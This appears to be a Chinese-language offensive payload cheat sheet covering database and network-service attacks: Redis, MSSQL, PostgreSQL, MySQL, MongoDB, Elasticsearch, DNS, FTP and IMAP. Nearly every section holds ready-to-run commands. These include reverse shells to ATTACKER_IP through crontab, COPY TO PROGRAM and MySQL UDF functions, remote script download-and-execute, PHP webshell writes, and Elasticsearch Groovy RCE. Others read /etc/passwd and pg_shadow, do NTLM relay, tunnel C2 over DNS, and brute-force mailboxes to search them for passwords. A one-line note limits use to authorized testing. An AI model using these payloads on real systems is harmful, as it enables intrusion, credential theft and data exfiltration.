# 数据库 / 网络服务攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 数据库攻击限于授权测试范围内的目标
> 涵盖: 数据库未授权访问与利用(Redis/MSSQL/PostgreSQL/MySQL/MongoDB/Oracle) / 数据库横向移动(dblink/linked server/FEDERATED) / Elasticsearch 攻击 / DNS 攻击 / FTP/IMAP 服务攻击

---

## 快速决策树

```
内网发端口扫描结果
├─ 发现数据库端口 → §1 数据库端口→攻击优先级表 → 选对应 §2 子节
├─ 发现 Elasticsearch (9200/9300) → §2.6 Elasticsearch
├─ 需要数据库横向移动 → §3 数据库横向移动
├─ 发现 DNS (53) → §4 DNS 攻击
├─ 发现 FTP (21) → §5 FTP 攻击
└─ 发现 IMAP (143/993) → §6 IMAP 攻击
```

---

## §1 数据库端口→攻击优先级速查表

| 端口 | 服务 | 优先级 | 重点攻击方向 | 快速验证命令 |
|------|------|--------|-------------|-------------|
| 6379 | Redis | 🔴 P0 | 未授权写 SSH key / crontab / webshell | `redis-cli -h IP PING` |
| 1433 | MSSQL | 🔴 P0 | 弱口令 + xp_cmdshell RCE / 链接服务器横向 | `nxc mssql IP -u sa -p sa` |
| 5432 | PostgreSQL | 🟠 P1 | 弱口令 + COPY TO 文件读取 / dblink 横向 | `psql -h IP -U postgres` |
| 3306 | MySQL | 🟠 P1 | 弱口令 + INTO OUTFILE 写 webshell / UDF 提权 | `mysql -h IP -u root` |
| 27017 | MongoDB | 🟡 P2 | 未授权 + 遍历数据库 / 注入 | `mongo IP/test` |
| 1521 | Oracle | 🟡 P2 | 弱口令 + SID 枚举 + 版本漏洞 | `tnscmd10g version IP 1521` |
| 9200 | Elasticsearch | 🟠 P1 | 未授权 + dump 全量数据 / RCE(版本相关) | `curl -s IP:9200/_cat/indices` |

---

## §2 数据库攻击

### 2.1 Redis (6379)

```bash
# === Phase 1: 未授权探测 ===
redis-cli -h IP PING                                   # 返回 PONG → 未授权
redis-cli -h IP -a password PING                       # 有密码尝试弱口令
redis-cli -h IP INFO                                   # 获取版本/配置/Keyspace

# === Phase 2: 利用（按场景选） ===
# 场景 A: 写 SSH Key（需 root 用户运行 Redis + 知道 SSH 用户名）
ssh-keygen -t rsa -f /tmp/redis_key -N ''
echo -e "\n\n$(cat /tmp/redis_key.pub)\n\n" > /tmp/key.txt
redis-cli -h IP CONFIG SET dir /root/.ssh/
redis-cli -h IP CONFIG SET dbfilename authorized_keys
redis-cli -h IP SET key "$(cat /tmp/key.txt)"
redis-cli -h IP SAVE
ssh -i /tmp/redis_key root@IP

# 场景 B: 写 crontab（需 CentOS/RedHat，Ubuntu 不适用）
redis-cli -h IP CONFIG SET dir /var/spool/cron/
redis-cli -h IP CONFIG SET dbfilename root
redis-cli -h IP SET cron "\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
redis-cli -h IP SAVE

# 场景 C: Web 写 webshell（需 Redis 运行用户有 Web 目录写权限）
redis-cli -h IP CONFIG SET dir /var/www/html/
redis-cli -h IP CONFIG SET dbfilename shell.php
redis-cli -h IP SET shell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h IP SAVE
curl http://IP/shell.php?cmd=id

# === 有密码时的爆破 ===
hydra -l "" -P /path/to/redis-password.txt IP redis
# 或 Nmap: nmap --script redis-brute -p 6379 IP
```

### 2.2 MSSQL (1433)

```bash
# === 认证测试 ===
nxc mssql IP -u sa -p sa                           # CrackMapExec 快速
nxc mssql IP -u sa -H :NTLM_HASH                   # Pass-the-Hash
impacket-mssqlclient user:password@IP               # Impacket 交互式

# === xp_cmdshell RCE（经典提权） ===
# 前提: 有 sysadmin 角色
impacket-mssqlclient sa:password@IP
# 在 mssqlclient 交互中:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -e {BASE64_PAYLOAD}"

# === NTLM 中继（SMB Relay） ===
# 前提: MSSQL 服务账户对 LDAP/SMB 签名策略不严格
# Responder 监听 + impacket-ntlmrelayx
SQL> xp_dirtree \\\\ATTACKER_IP\\share          # 触发 NTLM 认证到攻击者

# === 链接服务器横向移动 ===
# 前提: 当前 MSSQL 有到其他 MSSQL 的 Linked Server
SQL> SELECT name FROM sys.servers;                # 枚举链接服务器
SQL> EXECUTE('SELECT SYSTEM_USER') AT [LINKED_SRV];  # 在链接服务器上执行
# 如果链接服务器配置为 sa→sa 映射，直接横向
```

### 2.3 PostgreSQL (5432)

```bash
# === 未授权 / 弱口令 ===
psql -h IP -U postgres                                    # 默认超级用户
psql -h IP -U postgres -c "SELECT version()"

# === 文件读取 (COPY TO) ===
psql -h IP -U postgres -c "CREATE TABLE temp_read(t TEXT); COPY temp_read FROM '/etc/passwd'; SELECT * FROM temp_read;"
# 或直接 COPY 到 stdout:
psql -h IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'id'"

# === RCE (9.3+ COPY FROM PROGRAM) ===
# 前提: 有超级用户权限
psql -h IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'"

# === LoL 库加载 RCE (需要上传恶意 .so) ===
# 1. 上传 payload.so 到 /tmp (通过 COPY FROM PROGRAM 或 lo_import)
# 2. CREATE FUNCTION 加载恶意 .so

# === dblink 横向移动 ===
# 前提: dblink 扩展已安装 + 有远程连接凭据
psql -h IP -U postgres -c "CREATE EXTENSION dblink;"
psql -h IP -U postgres -c "SELECT dblink_connect('host=10.0.0.2 dbname=postgres user=postgres password=secret');"
psql -h IP -U postgres -c "SELECT * FROM dblink('conn','SELECT pass FROM pg_shadow') AS t(pass text);"
```

### 2.4 MySQL (3306)

```bash
# === 未授权 / 弱口令 ===
mysql -h IP -u root
mysql -h IP -u root -p'password' -e "SELECT @@version"

# === UDF 提权 (5.x, 需 plugin_dir 可写) ===
# 1. 确定 plugin_dir
mysql> SHOW VARIABLES LIKE 'plugin_dir';
# 2. 上传 raptor_udf.so → 创建 sys_exec 函数
mysql> CREATE FUNCTION sys_exec RETURNS STRING SONAME 'raptor_udf.so';
mysql> SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');

# === INTO OUTFILE 写 Webshell ===
# 前提: 有 FILE 权限 + 知道 web 路径 + secure_file_priv=''
mysql> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# === 读取敏感文件 ===
mysql> SELECT LOAD_FILE('/etc/passwd');

# === FEDERATED 横向 ===
# 前提: FEDERATED 引擎启用 + 能连接远程 MySQL
mysql> CREATE TABLE fed_table (...) ENGINE=FEDERATED CONNECTION='mysql://user:pass@target:3306/db/table';
mysql> SELECT * FROM fed_table;  # 横向读取远程 MySQL 数据
```

### 2.5 MongoDB (27017)

```bash
# === 未授权探测 ===
mongo IP/test --eval "db.version()"
mongo IP/test --eval "db.adminCommand({listDatabases:1})"
mongo IP/admin --eval "db.system.users.find()"

# === 数据枚举 ===
mongo IP/test --eval "db.getMongo().getDBNames()"          # 列出所有 DB
mongo IP/test --eval "db.getCollectionNames()"             # 列出所有 Collection
mongo IP/test --eval "db.{COLLECTION}.find().limit(10).pretty()"  # 读取前 10 条
mongo IP/admin --eval "db.system.users.find()"             # 找管理员凭据

# === 批量 dump ===
mongodump --host IP --port 27017 --out ./mongodb_dump/

# === MongoDB 注入 ===
# Web 应用中传给 Mongo 的参数可能被注入
# 常见模式: ?username[$ne]=1  (NoSQL 绕过认证)
# ?password[$regex]=.*  (盲注)
```

### 2.6 Elasticsearch (9200)

```bash
# === Phase 1: 未授权探测 ===
curl -s IP:9200/                                        # 基本信息 + 版本
curl -s IP:9200/_cat/indices?v                          # 列出所有索引
curl -s IP:9200/_cat/shards?v                           # 分片信息

# === Phase 2: 数据提取 ===
# 单个索引全量 dump
curl -s "IP:9200/{INDEX}/_search?scroll=5m&size=1000" -d '{"query":{"match_all":{}}}' \
  | jq '.hits.hits[]._source'
# 使用 scroll API 批量: 先获取 scroll_id → 循环 FETCH

# === Phase 3: RCE（版本相关） ===
# ES <1.2: MVEL 脚本引擎 RCE (CVE-2014-3120)
# ES 1.3-1.4.x: Groovy 脚本 RCE (CVE-2015-1427)
# ES 1.5+: Groovy 沙箱限制，但可通过 _search 注入绕过
curl -X POST "IP:9200/_search" -d '{"size":1,"script_fields":{"lupin":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'

# === 其他利用 ===
# Snapshot 仓库滥用: 创建 Snapshot 到 /etc 目录写文件
# Ingest Pipeline 注入: 低版本可注入 Groovy 脚本到 pipeline
```

---

## §3 数据库横向移动

### 3.1 横向决策树

```
已控制一台数据库服务器
├─ PostgreSQL
│   ├─ dblink → 使用已知凭据连接内网其他 PG
│   └─ postgres_fdw (Foreign Data Wrapper) → 映射远程表到本地
├─ MSSQL
│   ├─ Linked Server → EXECUTE('') AT [LINK_SRV] 横向
│   └─ OPENROWSET → SELECT * FROM OPENROWSET(...)
├─ MySQL
│   ├─ FEDERATED Engine → 建表映射远程 MySQL 数据
│   └─ UDF sys_exec → 代理内网请求
├─ Redis (无认证)
│   └─ 写 SSH key/crontab 拿 shell → 进而横向
└─ 通用 → 数据库服务器本身是 Linux/Windows → 拿 shell 后 SSF/frp 代理内网流量
```

### 3.2 数据库服务器作为代理跳板

```bash
# MSSQL: xp_cmdshell 反弹 shell
SQL> EXEC xp_cmdshell 'powershell iex(iwr http://ATTACKER_IP/rev.ps1 -UseBasicParsing)'

# PostgreSQL: COPY FROM PROGRAM 反弹 shell
psql -h IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# MySQL: 利用 UDF 执行命令
mysql> SELECT sys_exec('curl http://ATTACKER_IP/shell.sh|bash');

# Redis: 写 crontab 反弹 shell
# (见 §2.1 Redis 场景 B)
```

---

## §4 DNS 攻击 (53)

```bash
# === AXFR 区域传送 ===
dig axfr @DNS_IP domain.com
dig axfr @DNS_IP domain.com +short            # 可能泄露全部内网主机名和 IP

# === SRV 记录枚举（AD 环境） ===
# 发现域控制器和关键服务
dig SRV _ldap._tcp.domain.com @DNS_IP
dig SRV _kerberos._tcp.domain.com @DNS_IP
dig SRV _gc._tcp.domain.com @DNS_IP           # Global Catalog
dig SRV _kpasswd._tcp.domain.com @DNS_IP      # Kerberos 密码修改

# === NSEC/DNSSEC Walking ===
# 如果 DNSSEC 启用 NSEC (非 NSEC3)，可遍历全域名
ldns-walk @DNS_IP domain.com

# === 子域名爆破 ===
for sub in $(cat subdomains.txt); do host $sub.domain.com DNS_IP; done | grep -v NXDOMAIN

# === DNS 隧道（C2 出网） ===
# 前提: DNS 出网可达
# iodine:     iodine -f -P password ATTACKER_DNS domain.com
# dnscat2:    dnscat2 --dns server=ATTACKER_IP,port=53
# dns2tcp:    低带宽场景，适用于严格出网限制
```

---

## §5 FTP 攻击 (21)

```bash
# === Phase 1: Banner + 匿名登录 ===
nc -nv IP 21                                           # Banner 抓取
ftp IP                                                 # 尝试 anonymous:anonymous
# 匿名凭据变体: anonymous:(空) / ftp:ftp

# === Phase 2: 已知漏洞快速检测 ===
# vsftpd 2.3.4 → 后门在 6200 端口
# ProFTPD 1.3.3c-1.3.5 → SITE CPFR/CPTO 未授权文件复制
# Pure-FTPd 低版本 → 远程溢出
nmap --script ftp-* -p 21 IP

# === Phase 3: ProFTPD mod_copy 利用 ===
telnet IP 21
SITE CPFR /etc/passwd                                # 指定源文件
SITE CPTO /var/www/html/passwd.txt                    # 复制到 Web 可访问目录
# curl http://IP/passwd.txt → 验证读取成功

# === Phase 4: FTP Bounce（内网代理扫描） ===
nmap -b ftp:ftp@FTP_IP VICTIM_IP -p 22,80,443,445,1433,3389
# 原理: 利用 PORT 命令让 FTP 服务器向第三方地址发起连接
# 150 响应 → 端口开放 / 425 响应 → 端口关闭
```

---

## §6 IMAP 攻击 (143/993)

```bash
# === Phase 1: 服务识别 ===
nc -nv IP 143                                          # Banner + CAPABILITY
openssl s_client -connect IP:993 -quiet                # TLS 版本
nmap --script imap-ntlm-info -p 143 IP                 # Exchange NTLM 信息泄露

# === Phase 2: 凭据爆破 ===
hydra -l user@domain.com -P wordlist.txt IP imap -V
hydra -l user -P wordlist.txt IP -s 993 imaps -V

# === Phase 3: 邮箱枚举（已获取凭据后） ===
curl -sk 'imaps://IP:993/' --user user:pass            # 列出所有邮箱文件夹
curl -sk 'imaps://IP:993/INBOX?ALL' --user user:pass   # 列出收件箱邮件
curl -sk 'imaps://IP:993/INBOX?TEXT password' --user user:pass  # 搜索含"password"的邮件
curl -sk 'imaps://IP:993/INBOX;MAILINDEX=1' --user user:pass    # 下载第 1 封邮件

# === Phase 4: 邮件关键词搜索（高价值） ===
# "password" / "credentials" / "vpn" / "ssh key" / "admin"
# "reset password" → 密码重置链接
# "urgent" / "security" → 安全通知含敏感信息
```

---

## 注意事项

- **Redis 写 SSH key**：仅当 Redis 以 root 运行且目标用户 `.ssh` 目录存在 + selinux 关闭 → 成功率约 60%
- **Redis 写 crontab**：仅 CentOS/RedHat 系，Ubuntu/Debian 用 `/var/spool/cron/crontabs/`
- **MSSQL xp_cmdshell**：2017+ 默认关闭，需 `sp_configure 'xp_cmdshell', 1` 开启
- **PostgreSQL COPY PROGRAM**：9.3+ 且有超级用户权限，且 wal_level 非 minimal
- **MongoDB**：3.0+ 默认监听 localhost，互联网可见 MongoDB 多为配置错误
- **Elasticsearch RCE**：7.x+ 已移除 Groovy 脚本支持，仅低版本可利用
- **DNS AXFR**：现代 DNS 服务器默认禁用，仅配置错误时可用
- **FTP Bounce**：大多数现代 FTP 已禁用 PORT 第三方地址
- **IMAP 爆破**：Exchange 2019+ 默认账号锁定策略，批量爆破前确认

← 回 [00-index.md](00-index.md) · 相关: [16-recon.md](16-recon.md)(内网侦察) · [11-lateral.md](11-lateral.md)(横向移动)
